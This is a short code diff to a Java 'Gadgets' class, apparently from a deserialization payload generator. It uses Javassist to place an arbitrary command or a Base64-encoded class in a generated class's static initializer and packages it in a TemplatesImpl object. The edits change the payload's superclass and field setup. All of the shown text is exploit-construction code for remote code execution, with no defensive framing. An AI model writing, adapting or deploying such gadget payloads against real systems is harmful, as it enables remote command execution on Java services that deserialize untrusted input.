@@ -112,7 +112,7 @@ public class Gadgets {
             ctClass.setName(ctClass.getName() + System.nanoTime());
             String cmd = "cmd = \"" + command + "\";";
             ctClass.makeClassInitializer().insertBefore(cmd);
-            ctClass.setSuperclass(superC);
+//            ctClass.setSuperclass(superC);
             classBytes = ctClass.toBytecode();
         }
         if (myClass != null) {
@@ -150,7 +150,7 @@ public class Gadgets {
             String content = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
             // System.out.println(content);
             ctClass.makeClassInitializer().insertBefore(content);
-            ctClass.setSuperclass(superC);
+//            ctClass.setSuperclass(superC);
             classBytes = ctClass.toBytecode();
         }
 
@@ -160,7 +160,8 @@ public class Gadgets {
 
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
-        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        Reflections.setFieldValue(templates, "_transletIndex", 0);
+//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
 
